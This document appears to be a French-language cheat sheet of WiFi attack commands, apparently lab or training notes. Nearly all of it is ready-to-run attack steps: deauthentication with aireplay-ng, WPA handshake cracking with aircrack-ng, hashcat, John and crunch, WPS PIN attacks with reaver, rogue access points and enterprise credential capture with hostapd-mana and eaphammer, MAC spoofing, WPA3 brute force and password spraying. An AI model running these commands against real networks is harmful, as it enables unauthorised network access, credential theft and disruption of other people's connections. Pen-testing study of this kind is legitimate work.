## Connecter clef USB à Virtual Box

1. Menu config : ajouter USB
2. En haut sur entrée --> cocher la clef USB
3. Si ne fonctionne pas (rien pendant le snif) --> changer de port

## Tuer les processus

```bash
sudo airmon-ng check
sudo airmon-ng check kill
```

## airmon-ng

```bash
sudo airmon-ng start wlan0 # récupérer le nom
sudo airmon-ng start wlan0 3 # ajouter le numéro de channel
sudo iw dev wlan0mon info
sudo iwconfig wlan0mon
sudo airmon-ng --verbose
sudo airmon-ng --debug
sudo airmon-ng stop wlan0mon
```

# Air* tools

## airodump-ng

```bash
sudo airodump-ng wlan0mon -c 2 # récupérer BSSID
sudo airodump-ng wlan0mon --band abg
```

### Options

```bash
-c : channel
-w : sortie dans un fichier
--bssid : capturer uniquement selon le BSSID
```

### Explication

```bash
BSSID : adresse MAC du point d'accès
PWD : niveau du signal
RXQ : qualité de la réception
Beacons : nombre de trames envoyées par l'AP
Data : nombre de paquets capturés
#/s : nombre de paquets / seconde
CH : numéro de channel
MB : vitesse maximale prise en charge par le point d'accès
ENC : algorithme de chiffrement
CIPHER : chiffrement détecté
AUTH : protocole d'authentification
ESSID : SSID
```

## aireplay-ng

```bash
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
sudo iwconfig wlan1mon channel 11
```

## aircrack-ng

```bash
aircrack-ng -w /usr/share/john/password.lst -e livebox -b 34:08:04:09:38:3D cap01.cap
```

## WPA Attaques

### John

```bash
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e livebox -w - ~/cap01.cap
```

### Crunch

```bash
crunch 11 11 -t password%%% | aircrack-ng -e livebox cap01.cap -w -
```

### Hashcat

```bash
/usr/lib/hashcat-utils/cap2hccapx.bin cap01.cap output.hccapx
hashcat -m 2500 --depreciated-check-disable output.hccapx /usr/share/john/password.lst
hcxpcapngtool -o hash.hc22000 cap01.cap
hashcat -a 0 -m 22000 hash.hc22000 /usr/share/john/password.lst
```

## airdecap-ng

```bash
sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
```

## Attaque WPS

```bash
wash -i wlan0mon
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K # Pixie
-p # code pin vide
```

## Usurper un point d'accès

```bash
sudo airodump-ng -w discovery --output-format pcap wlan0mon
sudo hostapd-mana Mostar-mana.conf
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```

## Changer adresse MAC

```bash
systemctl stop network-manager
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

## Connecter au WiFi

### WPA3

```ini
network={
    ssid="your_ssid"
    psk="your_password"
    key_mgmt=WPA-PSK SAE
}
```

### Commandes

```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
sudo wpa_supplicant -Dwext -iwlan1 -c web.conf
sudo wpa_supplicant -i wlan0 -c wifi-client.conf
sudo dhclient wlan2 -v
nmcli device status
nmcli device set wlan0 managed yes
nmcli device connect wlan0
nmcli dev wifi list
nmcli dev wifi connect "YOUR_SSID" password "YOUR_PASSWORD"
nmcli connection show
```

## Lister les IP

```bash
sudo arp-scan -I wlan5 -l
```

## WPA MGT

### Récupérer mot de passe

```bash
python3 ./eaphammer --cert-wizard
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```

### Bruteforce ESSID

```bash
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

### Bruteforce WPA3

```bash
./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
```

### Password Spray

```bash
cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt
./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt
```